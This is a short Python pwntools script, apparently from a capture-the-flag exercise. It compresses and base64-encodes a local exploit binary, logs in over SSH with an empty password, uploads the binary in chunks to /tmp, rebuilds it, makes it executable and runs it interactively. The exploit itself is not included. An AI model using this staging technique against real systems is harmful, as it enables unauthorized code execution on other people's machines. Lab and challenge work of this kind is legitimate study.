#!/usr/bin/env python3
from pwn import *
import base64
import gzip
import os
import subprocess
import sys

HOST = "localhost"
PORT = 4000
USER = "ctf"

LOCAL_BIN = "./exploit"          # your already-built binary
REMOTE_B64 = "/tmp/exploit.gz.b64"
REMOTE_GZ  = "/tmp/exploit.gz"
REMOTE_BIN = "/tmp/exploit"

CHUNK_SIZE = 500

def sh_quote(s: str) -> str:
    return "'" + s.replace("'", "'\"'\"'") + "'"

def main():
    if not os.path.exists(LOCAL_BIN):
        print(f"[-] missing local file: {LOCAL_BIN}")
        sys.exit(1)

    with open(LOCAL_BIN, "rb") as f:
        raw = f.read()

    gz = gzip.compress(raw, compresslevel=9)
    b64 = base64.b64encode(gz).decode()

    print(f"[*] local binary size   : {len(raw)} bytes")
    print(f"[*] gzip size           : {len(gz)} bytes")
    print(f"[*] base64 text size    : {len(b64)} chars")

    s = ssh(
        host=HOST,
        port=PORT,
        user=USER,
        password="",
        ignore_config=True,
        cache=False
    )

    print("[*] cleaning remote temp files")
    s.run(f"rm -f {REMOTE_B64} {REMOTE_GZ} {REMOTE_BIN}")

    print("[*] uploading chunks")
    for i in range(0, len(b64), CHUNK_SIZE):
        chunk = b64[i:i + CHUNK_SIZE]
        cmd = f"echo -n {sh_quote(chunk)} >> {REMOTE_B64}"
        s.run(cmd)
        sleep(0.2)
        if (i // CHUNK_SIZE) % 50 == 0:
            print(f"    uploaded {min(i + CHUNK_SIZE, len(b64))}/{len(b64)}")

    print("[*] decoding and extracting")
    s.run(f"base64 -d {REMOTE_B64} > {REMOTE_GZ}")
    s.run(f"gzip -d -c {REMOTE_GZ} > {REMOTE_BIN}")
    s.run(f"chmod +x {REMOTE_BIN}")

    print("[*] running exploit")
    s.run('ls -alh /tmp')
    print(s.recvall().decode())
    p = s.process(REMOTE_BIN)
    p.interactive()

if __name__ == "__main__":
    main()